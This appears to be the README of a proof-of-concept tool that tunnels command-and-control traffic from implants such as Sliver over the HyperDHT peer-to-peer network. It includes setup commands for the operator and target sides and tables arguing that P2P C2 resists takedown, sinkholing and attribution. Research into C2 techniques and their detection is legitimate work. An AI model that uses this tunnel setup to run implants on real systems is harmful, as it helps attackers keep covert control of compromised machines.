# GhostShip

## P2P Tunnel for C2 Traffic

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Proof of Concept](https://img.shields.io/badge/Status-PoC-orange.svg)](#)

---

> **WARNING: This is a Proof of Concept (PoC)**
>
> GhostShip is a research project demonstrating P2P-based C2 tunneling. It is **NOT stealthy** and has significant detection surfaces:
> - Visible Node.js processes
> - Open local TCP ports detectable by EDR/XDR
> - DHT bootstrap connections are fingerprintable
> - No process hollowing, no rootkit techniques, no evasion
>
> This PoC validates the *transport concept* only. A production-grade native P2P C2 would require ground-up implementation with proper evasion techniques.

---

## Overview

**GhostShip** is a proof-of-concept peer-to-peer (P2P) tunnel designed to transport C2 traffic (such as [Sliver](https://github.com/BishopFox/sliver)) through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.

By utilizing [HyperDHT](https://docs.pears.com/building-blocks/hyperdht) from the [Pear](https://pears.com/) / [Holepunch](https://holepunch.to/) ecosystem, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, bypassing the need for public IPs, static domains, or traditional VPS infrastructure.

---

## How It Works

```
[Target Machine]                              [Operator Machine]

  C2 Implant                                    C2 Server
  (e.g., Sliver)                               (e.g., Sliver)
       |                                            |
       v                                            v
  127.0.0.1:8888                              127.0.0.1:8888
       |                                            |
       v                                            v
  GhostShip Client  <------P2P/DHT------>  GhostShip Bridge
```

**Data Flow:**
1. Operator starts their C2 server (e.g., Sliver with mTLS listener on port 8888)
2. Operator runs the **Bridge**, which connects to the local C2 server and exposes it via HyperDHT
3. Bridge generates a connection key (`hs://...`)
4. On the target, the **Client** connects to the DHT using the connection key
5. Client opens a local TCP port (default: 8888) for the implant to connect to
6. C2 implant connects to `127.0.0.1:8888` and traffic flows through the P2P tunnel

---

## Traditional C2 vs Native P2P C2

The comparison below is between **traditional centralized C2** and a **hypothetical native P2P C2** (not this PoC). A properly implemented native P2P C2 would have these theoretical advantages:

### Architecture Comparison

| Aspect | Traditional C2 | Native P2P C2 |
|--------|---------------|---------------|
| **Topology** | Star (clients → central server) | Mesh (peer-to-peer via DHT) |
| **Infrastructure** | VPS, domains, static IPs required | Zero infrastructure - DHT is public |
| **Single Point of Failure** | Server takedown = total loss | No central server to seize |
| **Attribution Risk** | Domain WHOIS, IP registration, hosting provider logs | DHT provides anonymity layer |
| **Cost** | $10-100+/month (VPS, domains, CDN) | Free (leverages existing DHT network) |
| **Setup Time** | Hours/days (provisioning, DNS propagation) | Seconds (generate key, connect) |

### Operational Security

| Factor | Traditional C2 | Native P2P C2 |
|--------|---------------|---------------|
| **Domain Fronting** | Often required for stealth | Not needed - no domains |
| **IP Rotation** | Manual or requires infrastructure | Automatic via DHT routing |
| **Sinkholing** | Domains can be seized | No DNS = nothing to sinkhole |
| **Traffic Analysis** | Recognizable C2 patterns to known IPs | Blends with legitimate DHT app traffic |
| **Takedown Requests** | Single target (your server) | No central point to take down |
| **Geoblocking** | Server IP can be blocked | DHT nodes are globally distributed |

### Technical Capabilities

| Feature | Traditional C2 | Native P2P C2 |
|---------|---------------|---------------|
| **NAT Traversal** | Requires port forwarding or redirectors | Built-in hole-punching |
| **Encryption** | Implementation-dependent | E2E by default (Noise protocol) |
| **Certificate Management** | Required for HTTPS/mTLS | Not needed - key-based identity |
| **Redundancy** | Requires multiple servers | Inherent in DHT mesh |
| **Offline Queuing** | Server can store commands | Both peers must be online |
| **Latency** | Direct connection (low) | DHT routing (variable, higher) |

### Detection Surface

| Indicator | Traditional C2 | Native P2P C2 |
|-----------|---------------|---------------|
| **Network IOCs** | Known IPs, domains | DHT bootstrap nodes only |
| **DNS Queries** | C2 domain lookups | No DNS queries for C2 |
| **Certificate Fingerprints** | TLS cert can be fingerprinted | No certificates exposed |
| **Beaconing Patterns** | Regular intervals to fixed IP | Distributed across DHT |
| **JA3/JA3S** | Fingerprintable TLS handshakes | Noise protocol (different signature) |

### Trade-offs Summary

| | Traditional | Native P2P |
|---|:---:|:---:|
| Setup complexity | Higher | Lower |
| Operational cost | Higher | None |
| Attribution risk | Higher | Lower |
| Latency | Lower | Higher |
| Offline support | Yes | No |
| Maturity/tooling | Established | Emerging |

---

## This PoC vs Native P2P C2

| Aspect | GhostShip (this PoC) | Native P2P C2 |
|--------|---------------------|---------------|
| **Implementation** | Node.js wrapper around existing C2 | Purpose-built from scratch |
| **Process visibility** | Visible node/client processes | Injected/hollowed, no visible processes |
| **Local ports** | Opens visible TCP listener | In-memory IPC, no ports |
| **EDR/XDR detection** | Easily detected | Evasion techniques built-in |
| **Binary size** | ~70MB (embedded Node.js) | Small native binary |
| **Purpose** | Validate P2P transport concept | Production use |

---

## Components

| Component | Description |
|-----------|-------------|
| **Bridge** | Runs on the operator's machine. Connects local C2 server to HyperDHT. |
| **Client** | Runs on the target. Opens local port for implant, tunnels to bridge via DHT. |

---

## Quick Start

### 1. Clone and Build

```bash
git clone https://github.com/bitsalv/ghostship.git
cd ghostship
```

### 2. Operator Side

**Start your C2 server:**
```bash
# Example with Sliver
sliver-server
sliver > mtls --lport 8888
```

**Start the GhostShip Bridge:**
```bash
cd bridge/nodejs
npm install
node bridge.js --port 8888
# Note the connection key: hs://abc123...
```

### 3. Target Side

**Start the GhostShip Client:**
```bash
cd client
npm install
node client.js --connect "hs://abc123..." --port 8888
```

**Run your C2 implant configured to connect to `127.0.0.1:8888`:**
```bash
# Example: Sliver implant generated with:
# generate --mtls 127.0.0.1:8888 --os linux --arch amd64
./implant
```

### 4. Receive Session

```
sliver > sessions
```

---

## Project Structure

```
ghostship/
├── bridge/
│   └── nodejs/
│       ├── bridge.js        # Bridge implementation
│       └── package.json
├── client/
│   ├── client.js            # Client implementation
│   └── package.json
└── .github/
    └── workflows/
        └── release.yml      # CI/CD pipeline
```

---

## Limitations (this PoC)

- **Not stealthy**: Visible processes, open ports, detectable by EDR/XDR
- **Large footprint**: ~70MB due to embedded Node.js runtime
- **Requires implant cooperation**: Your C2 implant must connect to `127.0.0.1:<port>`
- **Bridge must be running**: No persistence or queuing - both sides must be online
- **No evasion**: No AMSI bypass, no ETW patching, no process injection

---

## Disclaimer

This project is for **authorized security research and educational purposes only**.

This is a Proof of Concept to demonstrate P2P transport feasibility. It is not designed for operational use and lacks the evasion capabilities required for real-world scenarios.

Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## License

MIT License - See [LICENSE](LICENSE) for details.
